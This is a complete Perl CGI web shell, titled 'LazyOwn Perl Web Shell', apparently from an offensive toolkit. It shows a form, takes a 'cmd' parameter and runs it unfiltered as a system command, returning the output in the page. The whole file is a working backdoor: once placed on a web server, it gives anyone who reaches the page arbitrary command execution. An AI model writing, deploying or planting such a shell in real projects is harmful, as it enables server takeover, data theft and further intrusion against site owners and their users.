#!/usr/bin/perl

use strict;
use warnings;
use CGI qw(:standard);
use CGI::Carp qw(fatalsToBrowser);
use IPC::System::Simple qw(capture);

print header,
      start_html('Web Shell'),
      h1('LazyOwn Perl Web Shell');

if (param()) {
    my $command = param('cmd');
    my $output = capture("$command 2>&1");
    print "<pre>$output</pre>";
}

print start_form,
      "Command: ", textfield('cmd'), br,
      submit('Run Command'),
      end_form,
      end_html;
